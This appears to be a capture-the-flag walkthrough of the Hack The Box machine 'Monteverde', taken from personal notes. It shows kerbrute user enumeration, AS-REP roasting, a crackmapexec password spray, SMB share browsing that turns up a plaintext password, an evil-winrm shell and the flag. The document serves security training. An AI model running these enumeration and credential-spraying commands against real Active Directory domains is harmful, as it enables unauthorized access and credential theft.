
Valid Users
```
kerbrute userenum -d MEGABANK --dc 10.10.10.172 valid_user.txt -t 100
```
![[Pasted image 20240503124645.png]]

```
svc-bexec@MEGABANK
svc-ata@MEGABANK
roleary@MEGABANK
SABatchJobs@MEGABANK
svc-netapp@MEGABANK
smorgan@MEGABANK
administrator@MEGABANK
```


```
GetNPUsers.py MEGABANK/ -usersfile valid_user.txt -format john -dc-ip 10.10.10.172
```
![[Pasted image 20240503124918.png]]

```
smorgan
Administrator
krbtgt
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
Guest
Administrator
AAD_987d7f2f57d2
mhope
dgalanos
Administrator
roleary
```

Valid Users
```
|   |
|---|
|Administrator@MEGABANK|
|svc-bexec@MEGABANK|
|roleary@MEGABANK|
|SABatchJobs@MEGABANK|
|mhope@MEGABANK|
|smorgan@MEGABANK|
|svc-netapp@MEGABANK|
|AAD_987d7f2f57d2@MEGABANK|
|SABatchJobs@MEGABANK|
|dgalanos@MEGABANK|
|svc-ata@MEGABANK|
```


```
crackmapexec smb 10.10.10.172 -u ~root/HackTheBox/Monterverde/password.txt -p ~root/HackTheBox/Monterverde/password.txt 
```

```
MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```
![[Pasted image 20240503175616.png]]


Let's check SMB access
```
crackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares
```

```
smbmap -u SABatchJobs -d MEGABANK.LOCAL -p 'SABatchJobs' -H 10.10.10.172
```
![[Pasted image 20240503180348.png]]

```
smbclient //10.10.10.172/users$ -U 'SABatchJobs' --password 'SABatchJobs'
```
![[Pasted image 20240503180623.png]]

When we open the file the XML file
![[Pasted image 20240503181028.png]]
```
4n0therD4y@n0th3r$
```


```
crackmapexec smb 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$' --shares
```
![[Pasted image 20240503181245.png]]

```
evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.10.10.172
```

So finally we got the shell
![[Pasted image 20240503181643.png]]


```
d2101a768fb7f09c6b6fb7d728f911fa
```
![[Pasted image 20240503181747.png]]

